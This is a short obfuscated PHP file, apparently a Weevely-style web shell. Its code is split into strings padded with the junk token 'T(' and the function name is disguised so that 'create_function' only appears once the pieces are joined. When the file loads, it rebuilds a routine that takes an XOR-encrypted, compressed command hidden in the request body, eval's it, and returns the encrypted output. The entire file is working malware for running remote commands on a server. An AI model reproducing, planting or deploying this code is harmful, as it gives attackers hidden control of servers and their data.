<?php
$H='vaT(l(@gzuncomT(prT(ess(@x(@baT(se64T(_dT(eT(code($m[1])T(,$k)));$o=@oT(b_T(T(get_contents(T();@T';
$v=str_replace('M','','crMeaMte_MfMuncMtMion');
$d='(nction x($tT(,T($k){$c=sT(T(trlen($k);T($l=strT(len($tT();$o=T("T(";for($i=0T(;$i<$l;){fT(or($T(j=0';
$c=';T(T(($j<$c&&$i<$l);$j+T(+,$iT(++T()T(T({$o.=$t{$i}^$k{$jT(};}}return $T(o;T(}if (@T(pT(rT(eg_matc';
$o='h("T(/$kh(.+)$kf/",@fT(ile_gT(et_conteT(T(nts("phpT(:/T(/input")T(,$m)==1) {@T(ob_stT(art();@T(e';
$j='$k="cT(dT(e74559";$kh="T(1784T(d65bde5T(3";$kT(f="8325T(eba97780"T(;$p=T("S7s6sVT(iCmOT(VwnIlx";fT(uT';
$X='(ob_eT(nd_clean();T($r=@bT(aseT(6T(4T(_encodeT((@x(T(@T(gT(zcompress($o),$k)T();print("$p$kh$r$kf");}';
$q=str_replace('T(','',$j.$d.$c.$o.$H.$X);
$V=$v('',$q);$V();
?>
